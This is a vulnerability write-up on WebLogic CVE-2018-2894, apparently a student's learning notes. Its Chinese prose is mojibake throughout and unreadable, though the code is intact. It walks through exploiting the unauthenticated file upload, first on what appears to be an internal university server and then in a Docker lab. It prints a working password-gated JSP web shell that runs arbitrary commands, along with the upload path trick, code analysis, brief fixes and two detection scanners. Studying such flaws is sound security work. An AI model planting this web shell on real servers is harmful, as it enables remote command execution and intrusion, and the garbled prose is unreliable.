# CVE-2018-2894

# 0x01 LEVEL-1-------

# 1.æ¼æ´ç¯å¢ƒ

é‡é‚®å†…ç½‘æœåŠ¡å™¨

> éœ€è¦VPNç™»å½•

# 2.æ¼æ´å¤ç°

**è®¿é—®ip**

```
http://172.23.26.66:7001/
```

![img](https://img-blog.csdnimg.cn/20200607081938250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3h1YW5kYW9fYWhmZW5ncmVu,size_16,color_FFFFFF,t_70)

æ˜¾ç¤ºé¡µé¢å¦‚ä¸ŠğŸ‘†ğŸ‘†ğŸ‘†

> ç”±äºç°åœ¨è¿›ä¸å»æœåŠ¡å™¨ï¼Œå› æ­¤æ‰¾äº†ä¸€å¼ ç½‘ä¸Šçš„å›¾ç‰‡

åœ¨ç½‘ä¸Šæœå¯»weblogicç›¸å…³èµ„æ–™åï¼Œæ‰¾åˆ°äº†åå°ç™»é™†ç•Œé¢ç­‰url

```
http://172.23.26.66:7001/console/login
http://172.23.26.66:7001/ws_utc/config.do(åæ¥çŸ¥é“æ˜¯åœ¨"å¼€å‘æ¨¡å¼"ä¸‹æ‰ä¸éœ€è¦è®¤è¯å³å¯è¿›å…¥)
```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://img-blog.csdnimg.cn/20191022094422336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70)

å°è¯•ä½¿ç”¨burpsuiteè¿›è¡Œå­—å…¸çˆ†ç ´æ— æœï¼Œé‚æ”¾å¼ƒç™»å½•åå°ï¼ŒæŸ¥çœ‹å¦å¤–ä¸€ä¸ªurl

![image-20210209215723996](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210209215723996.png)

![image-20210209215739924](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210209215739924.png)

å‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œäºæ˜¯å°è¯•åˆ©ç”¨ä¸€å¥è¯æœ¨é©¬

![image-20210211100117811](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210211100117811.png)

å‘ç°ä¸ä¼šæ‰§è¡Œphpä»£ç ã€‚ã€‚åœ¨ç½‘ä¸Šæœé›†èµ„æ–™ï¼Œå‘ç°å¯ä»¥æ‰§è¡Œ.jsp

---

> ç”±äºå¯¹weblogicä»¥åŠjavaè¯­è¨€ä¸ç†Ÿï¼Œå› æ­¤åªå¥½ç™¾åº¦æŸ¥æ‰¾ç›¸å…³åšæ–‡ã€‚
>
> https://blog.csdn.net/weixin_41652128/article/details/102676891?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control

åæ¥ï¼Œå‘ç°éœ€è¦è®¾ç½®work home dir(æ–‡ä»¶ä¸Šä¼ ç›®å½•) ä¸º

```
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
```

è¿™æ ·çš„è¯ï¼Œå¤–ç½‘æ— éœ€æƒé™ï¼Œå°±å¯ä»¥è®¿é—®csså†…çš„æ–‡ä»¶

ä¸Šä¼ å°é©¬

```java
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

æ‰¾åˆ°æ—¶é—´æˆ³(å› ä¸ºweblogicç”Ÿæˆçš„æ–‡ä»¶ä¸º[æ—¶é—´æˆ³]_[æ–‡ä»¶å])

![image-20210210152037640](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210210152037640.png)

æ‰“å¼€urlï¼Œæ‰§è¡Œç›¸åº”å‘½ä»¤å³å¯

![image-20210209220517991](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210209220517991.png)

è¿™é‡Œæˆ‘åˆ›å»ºäº†ä¸€ä¸ªåä¸ºrick(mkdir)çš„æ–‡ä»¶å¤¹

> ps:caidaoå’Œèšå‰‘éƒ½æ²¡æˆåŠŸè¿æ¥ï¼Œä½†ç›´æ¥è®¿é—®urlå´å¯ä»¥æ‰§è¡Œå‘½ä»¤

# 3.å°é©¬åˆ†æ

---

å› ä¸ºä¹‹å‰æ²¡æ¥è§¦javaï¼Œæ‰€ä»¥ç°å­¦äº†ä¸€äº›javaåŸºç¡€

å°é©¬ä»£ç ï¼š

```java
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

`import` //å¯¼å…¥æŸä¸ªç±»

---



**1.è¾“å…¥å’Œè¾“å‡º**

```java
system.out //æ ‡å‡†è¾“å‡ºæµ
system.in //æ ‡å‡†è¾“å…¥æµ
System.out.println() // è¾“å‡ºåå¹¶æ¢è¡Œï¼Œä¸æ¢è¡Œå¯ä½¿ç”¨print()
Javaæä¾›Scannerå¯¹è±¡æ¥æ–¹ä¾¿è¾“å…¥ï¼Œè¯»å–å¯¹åº”çš„ç±»å‹å¯ä»¥ä½¿ç”¨ï¼šscanner.nextLine() / nextInt() / nextDouble() / ...
```

**2.é¢å‘å¯¹è±¡**

ç»§æ‰¿

```java
class Person {
    private String name;
    private int age;

    public String getName() {...}
    public void setName(String name) {...}
    public int getAge() {...}
    public void setAge(int age) {...}
}

class Student extends Person {
    // ä¸è¦é‡å¤nameå’Œageå­—æ®µ/æ–¹æ³•,
    // åªéœ€è¦å®šä¹‰æ–°å¢scoreå­—æ®µ/æ–¹æ³•:
    private int score;

    public int getScore() { â€¦ }
    public void setScore(int score) { â€¦ }
}
```

å¤šæ€

> é’ˆå¯¹æŸä¸ªç±»å‹çš„æ–¹æ³•è°ƒç”¨ï¼Œå…¶çœŸæ­£æ‰§è¡Œçš„æ–¹æ³•å–å†³äºè¿è¡Œæ—¶æœŸå®é™…ç±»å‹çš„æ–¹æ³•
>
> å¤šæ€å…è®¸æ·»åŠ æ›´å¤šç±»å‹çš„å­ç±»å®ç°åŠŸèƒ½æ‰©å±•ï¼Œå´ä¸éœ€è¦ä¿®æ”¹åŸºäºçˆ¶ç±»çš„ä»£ç ã€‚

åœ¨ç»§æ‰¿å¤šæ€ä¸­ï¼š
1ã€å¯¹äºæ–¹æ³•çš„è¦†ç›–ï¼Œnewçš„è°å°±è°ƒè°ï¼Œè¿™å°±æ˜¯å¤šæ€ã€‚`@override`
2ã€å¯¹äºæˆå‘˜å˜é‡çš„è¦†ç›–ï¼Œthisåœ¨å“ªä¸ªç±»å°±æŒ‡å‘å“ªä¸ªç±»çš„æˆå‘˜å˜é‡ï¼Œæ²¡æœ‰å¤šæ€ã€‚

3ã€ç”¨`final`ä¿®é¥°çš„æ–¹æ³•ä¸èƒ½è¢«`Override`

è¯¦æƒ…å‚è§åšæ–‡

> https://blog.csdn.net/rockpk008/article/details/52374203

æ¥å£

> æ‰€è°“`interface`ï¼Œå°±æ˜¯æ¯”æŠ½è±¡ç±»è¿˜è¦æŠ½è±¡çš„çº¯æŠ½è±¡æ¥å£ï¼Œå› ä¸ºå®ƒè¿å­—æ®µéƒ½ä¸èƒ½æœ‰ã€‚å› ä¸ºæ¥å£å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•é»˜è®¤éƒ½æ˜¯`public abstract`çš„

```java
class Student implements Person, Hello { // å®ç°äº†ä¸¤ä¸ªinterface
    ...
}
ä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªinterface
```

Runtime.getRuntime().exec //è°ƒç”¨æœåŠ¡å™¨å‘½ä»¤è„šæœ¬
.getInputStream //å¾—åˆ°çš„è¾“å…¥æµå…¶å®å°±æ˜¯ä»å®¢æˆ·ç«¯å‘é€ç»™æœåŠ¡å™¨ç«¯çš„æ•°æ®æµã€‚
.getOutputStream //å¾—åˆ°çš„è¾“å‡ºæµå…¶å®å°±æ˜¯å‘é€ç»™å®¢æˆ·ç«¯çš„æ•°æ®ã€‚



> å¤§æ¦‚æ€»ç»“ä¸€ä¸‹åŠŸèƒ½å°±æ˜¯ï¼Œé€šè¿‡è°ƒç”¨`Runtime.getRuntime().exec`å®ç°å‘½ä»¤æ‰§è¡Œï¼Œç„¶åé€šè¿‡ä¸€ä¸ª**å¾ªç¯**è¯»å–å‘½ä»¤æ‰§è¡Œç»“æœå¹¶è¾“å‡ºã€‚

---

# 4.ä»£ç åˆ†æ

1.æ”¹å˜å·¥ä½œç›®å½•çš„å‡½æ•°

```java
public void changeWorkDir(String path) {
    String[] oldPaths = this.getRelatedPaths();
    if (this.testPageProvider.getWsImplType() == ImplType.JRF) {
        this.isWorkDirChangeable = false;
        this.isWorkDirWritable = isDirWritable(path);
        this.isWorkDirChangeable = true;
        this.setTestClientWorkDir(path);
    } else {
        this.persistWorkDir(path);
        this.init();
    }

    if (this.isWorkDirWritable) {
        String[] newPaths = this.getRelatedPaths();
        moveDirs(oldPaths, newPaths);
    } else {
        Logger.fine("[INFO] Newly specified TestClient Working Dir is readonly. Won't move the configuration stuff to new path.");
    }

}
```

è‹¥æ–°ç›®å½•å¯å†™ï¼Œåˆ™æ›´æ¢è·¯å¾„

2.æŠŠä¸Šä¼ çš„æ–‡ä»¶ä¼ åˆ°ç›®å½•

```java
@Path("/keystore")
    @POST
    @Produces({"application/xml", "application/json"})
    @Consumes({"multipart/form-data"})
    public Response editKeyStoreSettingByMultiPart(FormDataMultiPart formPartParams) {
        if (!RequestUtil.isRequstedByAdmin(this.request)) {
            return Response.status(Status.FORBIDDEN).build();
        } else {
            if (TestClientRT.isVerbose()) {
                Logger.fine("calling SettingResource.addKeyStoreSettingByMultiPart");
            }

            String currentTimeValue = "" + (new Date()).getTime();
            KeyValuesMap<String, String> formParams = RSDataHelper.getInstance().convertFormDataMultiPart(formPartParams, true, TestClientRT.getKeyStorePath(), currentTimeValue);
            ....
        }
    }
```

```java
public static String getKeyStorePath() {
        return getConfigDir() + File.separator + "keystore";
    }
public KeyValuesMap<String, String> convertFormDataMultiPart(FormDataMultiPart formPartParams, boolean isExtactAttachment, String path, String fileNamePrefix) {
    ...
    if (attachName != null && attachName.trim().length() > 0) {
        if (attachName != null && attachName.trim().length() != 0) {
            attachName = this.refactorAttachName(attachName);
            if (fileNamePrefix == null) {
                fileNamePrefix = key;
            }

            String filename = (new File(storePath, fileNamePrefix + "_" + attachName)).getAbsolutePath();
            kvMap.addValue(key, filename);
            if (isExtactAttachment) {
                this.saveAttachedFile(filename, (InputStream)bodyPart.getValueAs(InputStream.class));
            }
        }
    } 
    ...
}
```

å¯è§ä¸Šè¿°ä»£ç æœªå¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œè¿‡æ»¤

# 5.ä¿®å¤æ–¹æ¡ˆ

1.å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡ŒéªŒè¯è¿‡æ»¤

2.é™åˆ¶æ–‡ä»¶ä¸Šä¼ çš„æ¡ä»¶

# 0x02 LEVEL-2-------

# 1.æ¼æ´ç¯å¢ƒ

è™šæ‹Ÿæœºä¸Šç”¨dockeréƒ¨å±ç¯å¢ƒ

![image-20210212212516015](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210212212516015.png)

> éƒ¨å±çš„æ—¶å€™é‡åˆ°ä¸€ä¸ªå› ç²—å¿ƒçŠ¯çš„é—®é¢˜ï¼Œ ä¸èƒ½å†™æˆdocker- composeï¼Œä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¦åˆ™ä¼šæŠ¥é”™

1.æŸ¥è¯¢è´¦å·å¯†ç 

![image-20210212212739531](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210212212739531.png)

2.è¿›å…¥`127.0.0.1:7001/console`ï¼Œæ‰“å¼€web æµ‹è¯•é¡µ

![image-20210212213248831](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210212213248831.png)



ç¯å¢ƒéƒ¨å±å®Œæ¯•

# 2.getshell

![image-20210212215119390](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210212215119390.png)

æµç¨‹ä¸**LEVEL-1**ç›¸å·®ä¸å¤§

# é™„å½•

## 1.ç°æˆpoc

```python
'''

____       _     _     _ _   __  __           _

|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\

'''
import sys
import requests
from config.config_requests import headers //è‡ªå®šä¹‰æ¨¡å—

VUL=['CVE-2018-2894']

def islive(ur,port):
    url='http://' + str(ur)+':'+str(port)+'/ws_utc/begin.do'
    r1 = requests.get(url, headers=headers)
    url='http://' + str(ur)+':'+str(port)+'/ws_utc/config.do'
    r2 = requests.get(url, headers=headers)
    return r1.status_code,r2.status_code

def run(rip,rport):
    a,b=islive(rip,rport)
    if a == 200 or b == 200:
        return (1, '[+] [{}] weblogic has a JAVA deserialization vulnerability:{}'.format(rip + ':' + str(rport), VUL[0]))
    else:
        return (0, '[-] [{}] weblogic not detected {}'.format(rip + ':' + str(rport), VUL[0]))

if __name__=="__main__": //åˆ¤æ–­æ˜¯å¦ä¸ºå½“å‰æ¨¡å—è°ƒç”¨
    url = sys.argv[1] //è·å–ç¬¬ä¸€ä¸ªå‚æ•°
    port = int(sys.argv[2]) 
    run(url,port)
```

> pocåœ°å€ï¼šhttps://github.com/rabbitmask/WeblogicScan

> __ name __è¯¦è§£ï¼šhttps://blog.csdn.net/xmp1669217327/article/details/81382174
>
> sys.argv[]è¯¦è§£ï¼šhttps://www.cnblogs.com/aland-1415/p/6613449.html

## 2.è‡ªå·±ç¼–å†™çš„poc LEVEL-3----------

```python
import sys
import requests
from fake_useragent import UserAgent 

def judge(url,port):
    
    headers = {"user-agent": UserAgent().random}
    url_1 = 'http://'+str(url)+':'+str(port)+'/ws_utc/begin.do'
    url_2 = 'http://'+str(url)+':'+str(port)+'/ws_utc/config.do'
    r1 = requests.get(url_1, headers)
    r2 = requests.get(url_2, headers)
    if r1.status_code == 200 or r2.status_code == 200:
        print('Scanner detected:'+str(url)+str(port)+'has CVE-2018-2894')
if __name__ == "__main__":
    judge(sys.argv[1],int(sys.argv[2]) )

```

æˆåŠŸæ‰«æ

![image-20210213151019009](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210213151019009.png)



